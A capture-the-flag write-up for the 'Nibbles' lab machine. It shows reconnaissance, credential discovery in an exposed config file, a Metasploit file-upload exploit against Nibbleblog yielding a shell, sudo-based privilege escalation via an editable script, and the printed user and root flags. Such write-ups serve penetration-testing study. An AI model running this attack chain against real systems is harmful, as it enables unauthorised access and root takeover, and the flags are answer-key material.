# Nibbles

## Initial NMAP Scan

```
# Nmap 7.94SVN scan initiated Thu Apr 18 08:02:06 2024 as: nmap -sC -sV --open -A -oA nibbles_initial_nmap_scan 10.129.240.184
Nmap scan report for 10.129.240.184
Host is up (0.12s latency).
Not shown: 654 filtered tcp ports (no-response), 344 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 18 08:02:45 2024 -- 1 IP address (1 host up) scanned in 39.78 seconds
```

* apache web server on port 80 and ssh on port 22
* curl 10.129.200.170 shows a simple "hello world!"

## Checking the source code of the page reveals:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

## Visiting [http://10.129.200.170/nibbleblog/](./#visiting-http-10.129.200.170-nibbleblog-shows-a-basic-blog-site-and-at-the-bottom-of-the-page-shows) shows a basic blog site and at the bottom of the page shows:

### &#x20;"Powered by Nibbleblog"

## Searchsploit

```
seachsploit nibbleblog
```

```
Nibbleblog 3 - Multiple SQL Injections  | php/webapps/35865.txt  
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)  | php/remote/38489.rb 
```

## Metasploit

```
msfconsole
use multi/http/nibbleblog_file_upload
set RHOST 10.129.200.170
```

* `show options` tells us we actually need a username and password.

## Gobuster

```
gobuster dir -u http://10.129.200.170/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt
```

```
/admin
/admin.php
/content
/index.php
/languages
/plugins
/README
/themes
```

* [http://10.129.200.170/nibbleblog/content/private/users.xml](http://10.129.200.170/nibbleblog/content/private/users.xml)
  * users.xml shows us there is an admin user.
* [http://10.129.200.170/nibbleblog/content/private/config.xml](http://10.129.200.170/nibbleblog/content/private/config.xml)
  * shows a couple potential passwords:
    * yum yum
    * nibbles

## Blog Login

* [http://10.129.200.170/nibbleblog/admin.php](http://10.129.200.170/nibbleblog/admin.php)
* `admin : nibbles` are the credentials

## Back to Metasploit

```
(Meterpreter 1)(/var/www/html/nibbleblog/content/private/plugins/my_image) > 
getuid 
Server username : nibbler

shell
```

## Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### User Flag

```
cat ~/user.txt
79c03865431abf47b90ef24b9695e148
```

* in the nibbler user's home directory there is a personal.zip file. unzipping it shows a script file `/home/nibbler/personal/stuff/monitor.sh`
* nothing interesting in the bash script.

## Privilege Escalation

```
sudo -l
```

* Out put shows our user has root NOPASSWD permissions on that monitor.sh file.

### Backup and Edit monitor.sh

```
cp /home/nibbler/personal/stuff/monitor.sh /home/nibbler/personal/stuff/monitor.sh.bak

echo "cat /root/root.txt" >> monitor.sh

sudo /home/nibbler/personal/stuff/monitor.sh
```

### Root Flag

`de5e5d6619862a8aa5b9b212314e0cdd`
